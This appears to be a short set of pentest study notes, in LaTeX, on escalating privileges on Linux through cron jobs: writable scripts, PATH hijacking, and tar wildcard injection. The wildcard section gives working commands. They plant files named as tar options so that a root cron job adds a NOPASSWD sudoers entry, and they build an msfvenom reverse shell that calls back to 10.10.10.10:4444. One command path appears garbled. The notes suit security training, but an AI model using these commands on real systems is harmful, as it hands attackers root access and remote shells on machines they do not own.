
\section{Scheduled Task/Job} 


\subsection{File permissions}

With write access to a script executed by a cron especialy run by root it is
possible to write a payload.

\subsection{PATH Environment Variable}

if a cron job is not explicitely referencing an absolute path it might by
apossible to create a malicious file that we can write in a directory that is
parsed before the directory containing file executed before the cron job.

pay attention to the \verb+PATH+ defined in the cron job


\subsection{Wildcard}

when a cron task contains a \verb+tar+ command with a wildcard it is possible
to do nasty stuff with writable access to the directory.
\begin{verbatim}
man tar

<SNIP>
Informative output
       --checkpoint[=N]
              Display progress messages every Nth record (default 10).

       --checkpoint-action=ACTION
              Run ACTION on each checkpoint.
\end{verbatim}

so if the cron task is the following:
\begin{verbatim}
*/01 * * * * cd /tmp && tar -zcf /tmp/backup.tar.gz *
\end{verbatim}

it is possible to create the following files in the tmp dir:
\begin{verbatim}
echo 'echo "cliff.moore ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
echo "" > "--checkpoint-action=exec=sh root.sh"
echo "" > --checkpoint=1
\end{verbatim}

another soluthion is to craft a revershell 
\begin{verbatim}
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf
\end{verbatim}
then:
\begin{verbatim}
touch /tmp/--checkpoint=1
touch //--checkpoint-action=exec=shell.elf
\end{verbatim}




